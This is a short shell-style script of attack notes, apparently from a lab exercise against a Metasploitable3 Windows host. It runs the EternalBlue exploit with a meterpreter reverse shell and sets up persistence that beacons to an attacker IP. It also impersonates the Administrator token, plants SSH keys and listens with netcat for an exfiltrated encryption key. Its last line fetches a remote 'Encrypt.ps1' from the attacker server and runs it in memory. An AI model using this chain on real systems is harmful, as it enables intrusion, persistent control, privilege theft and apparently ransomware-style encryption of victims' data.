#!/bin/bash

# I picked this approach because its file less attack and loads everything in memory.

# Start ssh serer and load metasploit database
sudo systemctl start ssh
sudo systemctl start postgresql
sudo msfdb init


# Listen for incomming AES key.
nc -lvp 8000 > certs/encrypted.enc
	#Decrypting AES key.
	openssl cms -decrypt -in encrypted.enc -recip certificate.crt -inkey privateKey.key -inform PEM

# Start a python server in A1 (base directory)
python -m http.server 80

# Eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOST <Metasploitable3 IP>
set	LHOST <Kali IP>
set LPORT 4321
set payload windows/x64/meterpreter/reverse_tcp
run
# On meterpreter attain a persistent shell, to do that use persistent option
run persistence -X -i 5 -p 443 -r 11.1.0.21
reboot
exit
	# X - On restarts, i - Every 5 seconds beacon performs check, p - attacker's Port number, r - attacker's IP address

	# Payload 
	use exploit/multi/handler
	set PAYLOAD windows/meterpreter/reverse_tcp
	set LHOST 11.1.0.21
	set LPORT 443
	exploit

    # Performing token impersonation
	load incognito
	list_tokens -u
	impersonate_token METASPLOITABLE3\\Administrator

# If need be clear old ssh authorized_keys before hand
	# Generate keys on windows
	ssh-keygen -t ed25519 -b 4096 -C "Windows" -q -N '""' -f $env:Temp\update-pb
	# Add it in Kali’s authorized_users
	cat $env:Temp\update-pb.pub

# Run the script on Windows
Invoke-Expression (Invoke-WebRequest http://11.1.0.21/Encrypt.ps1 -UseBasicParsing)